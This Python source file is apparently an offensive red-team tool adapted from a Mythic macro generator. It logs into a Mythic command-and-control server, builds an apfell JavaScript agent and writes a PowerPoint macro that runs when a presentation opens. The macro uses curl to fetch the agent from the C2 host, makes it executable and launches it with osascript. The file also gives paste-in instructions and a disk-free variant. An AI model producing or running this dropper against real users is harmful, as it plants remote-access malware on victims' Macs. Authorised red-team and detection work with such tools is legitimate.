# Adapted from https://github.com/cedowens/Mythic-Macro-Generator

import os
import asyncio
from .Utilities import *


def macro_powerpoint():
    payload = "./Payloads/MacroPowerPoint_Payload"
    # url = mythic_payload_url + "/PowerPoint_Macro.js"   # Used for where the JXA payload is hosted

    os.mkdir(payload, 0o775)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="PowerPoint Macro",
                                           filename="PowerPoint_Macro.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            payload_info = await get_payload_data(mythic_instance=mythic_instance, payload_uuid=resp["uuid"])
            url = await get_payload_download_url(payload_info)
            pkg_payload = payload + "/PowerPoint_Macro.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)
            macrofile = open(payload + '/macro.txt', 'w')
            # macrofile.write('Sub AutoOpen()\n')
            macrofile.write('Sub App_AfterPresentationOpen()\n')
            macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o powerpoint.js\"\" \")" % url)
            macrofile.write("\n")
            macrofile.write("MacScript(\"do shell script \"\"chmod +x powerpoint.js\"\"\")")
            macrofile.write("\n")
            macrofile.write("MacScript(\"do shell script \"\"osascript powerpoint.js &\"\"\")")
            macrofile.write("\n")
            macrofile.write("End Sub")

            print("Note: \n"
                  "1) Copy the macro from Payloads/MacroPowerPoint_Payload/macro.txt to paste into Powerpoint \n"
                  "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Powerpoint/Data/powerpoint.js\n"
                  "3) You could replace command with 'curl -k 'URL' | osascript -l JavaScript &' to avoid disk writes but in testing this hangs the application")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
